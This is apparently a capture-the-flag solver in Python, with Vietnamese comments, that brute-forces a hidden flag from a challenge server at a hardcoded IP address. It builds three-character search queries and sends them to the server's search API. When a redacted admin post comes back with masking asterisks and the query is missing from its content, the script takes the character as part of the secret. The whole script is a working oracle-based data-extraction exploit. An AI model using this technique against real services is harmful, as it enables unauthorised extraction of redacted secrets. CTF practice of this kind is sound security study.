import requests
import string

charset = ''.join(c for c in string.printable if c not in ' \t\n\r\x0b\x0c')
discovered = 'L3AK{L3ak1ng_ther'  # hiện tại đã brute được tới đây
flag_length = 24  # độ dài flag bạn đã đo được qua số ký tự '*'

def test_triplet(triplet):
    try:
        res = requests.post(
            'http://34.134.162.213:17000/api/search',
            json={'query': triplet},
            timeout=5
        )
        data = res.json()

        for post in data['results']:
            if (post['title'] == "Not the flag?" and
                post['author'] == "admin" and
                post['date'] == "2025-05-13"):

                content = post['content']
                # Nếu triplet không thấy trong content nhưng có '****' → bị che → nằm trong flag
                if triplet not in content and '****' in content:
                    return True
        return False
    except Exception as e:
        print(f'[x] Error with triplet {triplet}: {e}')
        return False

while len(discovered) < flag_length:
    found = False
    for c in charset:
        triplet = discovered[-2:] + c
        print(f'[?] Trying triplet: {triplet}')
        if test_triplet(triplet):
            discovered += c
            print(f'[+] Found next char: {c}')
            print(f'[✓] Flag so far: {discovered}')
            found = True
            break
    if not found:
        print('[!] Cannot find next character. Stopping.')
        break

print('\nFinal flag:', discovered)
